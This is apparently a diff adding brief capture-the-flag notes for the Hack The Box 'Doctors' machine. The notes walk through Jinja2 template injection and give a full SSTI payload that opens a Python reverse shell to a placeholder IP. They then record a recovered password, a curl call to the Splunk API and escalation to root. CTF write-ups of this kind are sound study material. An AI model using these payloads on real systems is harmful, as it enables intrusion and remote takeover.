@@ -1,0 +1,35 @@
+-- Adding doctors.htb to hosts and visiting gets me a log in page
+
+-- I registed a new user, got message 'Your account has been created, with a time limit of twenty minutes!'
+
+-- Enumarating directories we get an odd looking /archive dir. The web page appears empty
+but uppon inspecting the source code we can see the messages we post appear there 
+
+-- Testing for Server Side Template Injection on the message. As the back end is built
+on Python (we can verify that from looking are the responses we get in burp) Jinja2 is
+the template engine we test. 
+
+-- At first glance the injection ({{7 * 7}} seems to have failed but if we take a look 
+a look at the archive page thought the page source we can see that it works.
+
+
+-- Next step is to create a reverse shell. Following the https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection on Jinja2 we came up with 
+a working reverse shell payload
+
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
+
+
+-- Downloaded the database and found admin users password hashed. Will try to crack!
+
+
+-- Running linpeas and scanning the results we get some info on shaun and what looks like
+a password 'Guitar123'
+
+-- su shaun with the password gets us in
+
+
+-- Running the command curl -k -u shaun:Guitar123 https://localhost:8089/services/messages
+proves we can use splank commands as user shaun. Lets try to use it to escalate to root
+
+
+-- Following https://github.com/tevora-threat/splunk_local_privesc/blob/master/spelunker.sh and changing the script a bit give us root access
